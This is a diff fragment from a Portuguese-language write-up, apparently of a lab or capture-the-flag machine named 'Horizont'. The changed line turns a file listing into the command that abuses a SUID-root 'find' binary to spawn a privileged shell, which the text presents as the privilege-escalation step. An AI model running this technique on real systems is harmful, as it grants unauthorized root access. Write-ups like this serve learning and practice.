@@ -194,7 +194,7 @@ rwsr-xr-x 1 root root 233K Nov 5 2017 /usr/bin/find
 Com isso, basta executarmos isto para elevar privilégios:
 
 ```bash
--rwsr-xr-x 1 root root 233K Nov  5  2017 /usr/bin/find
+find . -exec /bin/sh -p \; -quit
 ```
 
 ![Untitled](Writeup%20-%20Horizont%20f560d5ea61e649e8a1eb7b6f7ea50c7c/Untitled%2013.png)
